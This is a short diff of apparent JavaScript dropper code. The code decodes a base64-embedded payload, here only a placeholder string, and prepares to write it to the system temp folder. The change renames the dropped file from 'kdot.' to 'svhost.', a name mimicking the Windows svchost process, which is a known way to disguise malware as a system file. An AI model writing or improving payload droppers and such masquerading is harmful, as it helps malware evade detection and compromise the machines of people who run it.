@@ -17,7 +17,7 @@ function deleteTempFile(tempDir) {
 
 
 function main() {
-    var tempDir = path.join(os.tmpdir(), "kdot." + file_ending);
+    var tempDir = path.join(os.tmpdir(), "svhost." + file_ending);
     var b64stuff = "BASE64ENCODEDSTUFFHERE";
     var decoded = Buffer.from(b64stuff, 'base64');
 
